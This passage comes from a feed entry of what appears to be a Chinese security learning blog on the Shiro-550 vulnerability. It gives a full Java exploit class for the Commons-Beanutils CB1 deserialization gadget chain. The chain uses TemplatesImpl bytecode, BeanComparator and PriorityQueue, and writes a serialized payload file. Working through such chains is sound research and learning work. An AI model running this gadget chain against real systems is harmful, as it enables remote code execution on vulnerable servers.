class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="comment">//反序列化执行readObject()方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        fis.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化完成...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694001928851-8156d309-1739-415b-87d5-5b5dcac9c973.png" alt="image.png"><br>接下来，开始找谁调用了getProperty，这里发现了BeanComparator#compare，很符合我们要求<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694002167720-97c47687-39cd-4509-b9d9-600979d5ce47.png" alt="image.png"><br>看到compare就很熟悉，在CC4的priorityQueue这个入口类里，我们用到过compare来触发xxx.transform<br>在CB1链里，我们只需要使用priorityQueue反序列化时，会调用到compare这个特性即可<br><strong>注意：下面的add会提前触发链条，这里选择先add，再通过反射设置属性，保证链子不被破坏。</strong><br>最终Exp如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCB1</span> &#123;</span><br><span class="line">    <span class="comment">// 参考CC3和CC4</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"><span class="comment">//        JavaBean bean = new JavaBean();</span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;name = &quot;+ PropertyUtils.getProperty(bean,&quot;name&quot;));</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Jasper&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Codes\\Java\\javasec\\CC\\target\\classes\\pojo\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,codes);</span><br><span class="line">        <span class="comment">// 提前触发链条看效果，就要设置_tfactory</span></span><br><span class="line"><span class="comment">//        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span></span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line"><span class="comment">//        templates.getOutputProperties();</span></span><br><span class="line"><span class="comment">//        PropertyUtils.getProperty(templates,&quot;outputProperties&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line"><span class="comment">//        setFieldValue(beanComparator,&quot;property&quot;,&quot;outputProperties&quot;);</span></span><br><span class="line"><span class="comment">//        beanComparator.compare(templates,templates);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        // add会提前触发链条，这里选择先提前add，再统一传参</span></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(beanComparator);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"><span class="comment">//        // 统一传参，防止链条被破坏</span></span><br><span class="line">        setFieldValue(priorityQueue,<span class="string">&quot;queue&quot;</span>,<span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>[]&#123;templates,templates&#125;);</span><br><span class="line">        setFieldValue(beanComparator,<span class="string">&quot;property&quot;</span>,<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">       serialize(priorityQueue);</span><br><span class="line">        <span class="comment">// unserialize();</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;object.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(o);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;序列化完成...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;object.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="comment">//反序列化执行readObject()方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        fis.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化完成...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694003006742-1a409a1f-5c46-4f8e-a48a-8ee199c68567.png" alt="image.png"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>shiro550这个洞，就是反序列化套了一层AES加密，AES密钥已知的基础上，本质就是一个简单的反序列化漏洞。<br>感觉更多的是考察在Shiro的依赖条件下，要怎么RCE，通过这个洞学到了URLDNS、CC8、CB1三条链子。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;参考链接&quot;&gt;&lt;a href=&quot;#参考链接&quot; class=&quot;headerlink&quot; title=&quot;参考链接&quot;&gt;&lt;/a&gt;参考链接&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://www.bilibili.com/video/BV1iF411b7bD&quot;&gt;https://</summary>
      
    
    
    
    
    <category term="Java" scheme="https://jaspersec.top/tags/Java/"/>
    
    <category term="反序列化" scheme="https://jaspersec.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="Shiro" scheme="https://jaspersec.top/tags/Shiro/"/>
    
  </entry>
  
</feed>
